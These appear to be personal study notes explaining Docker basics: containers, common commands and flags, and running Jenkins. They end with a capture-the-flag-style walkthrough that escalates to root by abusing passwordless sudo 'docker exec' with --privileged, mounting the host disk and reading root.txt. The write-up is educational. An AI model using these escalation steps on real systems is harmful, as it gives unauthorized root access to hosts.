What is docker?

Docker

  • Docker is a containerization platform.
  • It lets you run applications in isolated environments called containers.
  • Packages your app + dependencies + environment into a single unit
VM Whole apartment with its own OS, furniture, etc.
Docker Container A fully furnished room in a shared apartment—lightweight, isolated, fast to set up.

⭐ Basic Virtualization Terms

Term Meaning
Host OS The actual operating system running on the physical PC or server (e.g., Ubuntu, Kali Linux)
Guest OS A virtualized or containerized operating system environment isolated from the host (e.g., inside a VM or container)
Host The real machine and OS that supports and runs virtual environments like containers or VMs
Container A lightweight, isolated space running on the host that shares its resources but appears as a separate environment

Main Purpose

1. isolation

  • Docker containers isolate applications' file systems, processes, and network stack.
  • This avoids dependency hell and prevents apps from interfering with each other.

Common codes

Command Purpose Exmple Usage Description
docker ps Show running containers docker ps Lists only running containers (like ps in Linux). Use -a to see all containers including stopped ones.
docker exec -it <id> bash Access a running container docker exec -it 123abc bash Starts an interactive bash shell inside a running container. -i = interactive, -t = TTY.
docker run Start a new container docker run -it ubuntu bash Creates and starts a new container from an image. Can attach terminal, set ports, volumes, etc.
docker images Show all local images docker images Lists all Docker images you have pulled or built locally.
docker inspect View low-level container/image info docker inspect 123abc Outputs detailed JSON data about a container or image: env, mounts, IP, entrypoint, etc.

Docker Option Flags

Option Command Context Example Usage Description
-i docker exec / docker run docker exec -i 123abc bash Keep STDIN open (for interactive use).
-t docker exec / docker run docker run -t ubuntu Allocate a pseudo-TTY (creates a terminal).
-it docker exec / docker run docker exec -it 123abc bash Combination of -i and -t for full terminal interaction.
--privileged docker run docker run --privileged ubuntu Grants full access to all devices and kernel capabilities inside the container.
--user docker run docker run --user root Tells Docker to run the command as root inside the container, regardless of default container user.
-d docker run docker run -d nginx Run container in background (detached mode).
-p docker run docker run -p 8080:80 nginx Maps host port to container port (host:container).
--rm docker run docker run --rm ubuntu Automatically remove the container when it exits.
-v docker run docker run -v /host:/container ubuntu Mount a host directory into the container.

How to Start

1. 

└─$ sudo docker pull jenkins/jenkins:lts-jdk17

🧠 What it does:

  • Downloads the Jenkins Docker image from Docker Hub:
  • jenkins/jenkins = the official Jenkins image
  • lts-jdk17 = Long-Term Support (LTS) version of Jenkins built with Java 17

📦 Result:

  • You now have the image locally cached so it can be run without needing to re-download.

2. 

└─$ sudo docker run -p 8080:8080 --restart=on-failure jenkins/jenkins:lts-jdk17

🧠 What it does:

Option Meaning
docker run Start a new container
-p 8080:8080 Port forwarding: expose container port 8080 → host port 8080 (so you can access Jenkins at http://localhost:8080)
--restart=on-failure If the container crashes (exits with error), Docker will automatically restart it
jenkins/jenkins:lts-jdk17 The image to run (previously pulled)

3. 

└─$ sudo docker ps -a

📋 Lists all Docker containers, including:

  • Running
  • Stopped
  • Exited

Useful for finding container IDs, names, and statuses

4. 

└─$ sudo docker start 2b3
  • Starts the container whose ID starts with 2b3
  • Docker allows partial container IDs, as long as they are unambiguous
  • The container must already exist (e.g., created earlier)

5. 

└─$ sudo docker exec -it 2b3 bash
  • Executes an interactive shell (bash) inside the running container
  • -i: interactive mode (keeps STDIN open)
  • -t: allocates a pseudo-terminal (gives you a shell-like interface)
  • This is how you “enter” a running container

Jargons

keep STDIN open

  • The -i flag keeps the keyboard input (STDIN) open even if you're not typing, so the container can read input from you continuously.
  • Without -i, commands like bash would start and immediately exit because there's no user input.

pseudo-TTY

  • fake terminal interface that programs can interact with as if they were connected to a real terminal (like a keyboard + monitor).
  • run interactively
  • use terminal-like features (input/output, line editing, signals)

docker exec -it <container_id> bash

  • -i keeps STDIN open (so you can send input)
  • -t allocates a pseudo-TTY, making the session behave like a terminal

This allows you

  • get a colorized prompt
  • use keyboard shortcuts (like Ctrl+C)
  • use interactive shell tools (nano, top, htop, etc.)

Real Case Explanation

1. Docker-Related Restrictions and Information Gathering

  • Attempting to run docker ps results in a permission error
user@data:~$ docker ps
Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock
  • Checking the permissions of the Docker socket
user@data:~$ ls -l /var/run/docker.sock
srw-rw---- 1 root root 0 Jun 16 01:16 /var/run/docker.sock
  • Listing running Docker-related processes
user@data:~$ ps auxww | grep docker
...
root 1517 ... containerd-shim-runc-v2 -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 ...

※ps auxww

Part Meaning
ps Process Status - the base command to show current running processes
a Show processes for all users (not just your own)
u Show the process's user/owner and more detailed info
x Show processes not attached to a terminal (e.g., daemons)
ww Show full command lines, no truncation (wide format x2)

2. Privilege Escalation Trigger

  • sudo -l reveals Docker exec privilege without password
User user may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *

3. Privilege Escalation: Gaining Host Access

  • Entering a running container as root with --privileged
user@data:~$ sudo docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash
bash-5.1#
  • Mounting the host filesystem inside the container
bash-5.1# mount /dev/sda1 /mnt/
  • Reading the root flag from the host
bash-5.1# cat /mnt/root/root.txt
d5a19473************************

Basic Knowledge to Read mount /dev/sda1 /mnt/ Output

1. Left Side = Mount Source (Where the data comes from)

Example Meaning
/dev/sda1Physical disk (SSD/HDD) partition
tmpfs, proc, sysfsVirtual filesystems (RAM-based or kernel-generated)
/var/lib/snapd/snaps/...Snap application squashfs image

2. Right Side = Mount Target (Where it's mounted into the OS)

Example Meaning
/Root of the entire system (top-level directory)
/mnt/Temporary mount point for external disks
/snap/...Snap app read-only mount location
/proc, /sys, /devVirtual filesystem entries for system internals

3. Common mount Lines and Their Purpose

mount Line Explanation
/dev/sda1 on /System is running from this physical disk partition (root filesystem)
tmpfs on /runTemporary space in RAM; disappears after reboot
proc on /procShows kernel + process info (virtual, not real files)
/dev on /devAccess point for hardware (USB, storage, etc.)
/var/lib/snapd/snaps/... on /snap/...Snap apps mounted as read-only images
lxcfs on /var/lib/lxcfsUsed by LXC/LXD containerization systems
nsfs on /run/snapd/ns/docker.mntNamespace FS, used to isolate Docker/Snap containers
